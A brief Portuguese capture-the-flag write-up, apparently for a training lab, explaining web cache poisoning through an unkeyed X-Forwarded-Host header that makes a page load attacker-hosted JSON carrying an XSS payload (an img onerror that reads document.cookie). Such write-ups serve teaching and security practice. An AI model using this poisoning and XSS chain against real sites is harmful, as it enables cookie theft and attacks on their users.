#ctf

O HTML mostra um json: 

```html
<script>
    data = {
        "host":"example.com",
        "path":"/",
    }
</script>
```

Que pode ser alterado usando a unkeyed X-Forwarded-Host (o Param Miner descobre isso).

Esse **data.host** é usado para importar um arquivo .json através desse *script*:

```html
<script>
    initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
</script>
```

Essa função **initGeolocate** presente em `/resources/js/geolocate.js` pega o atributo "country" presente no json e lança no HTML.

Usando exploit server do lab basta configurar os campos:

```
/resources/json/geolocate.json`

HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Access-Control-Allow-Origin: *

{
"country":"<img src=1 onerror=javascript:alert(document.cookie)></img>"
}
```

GG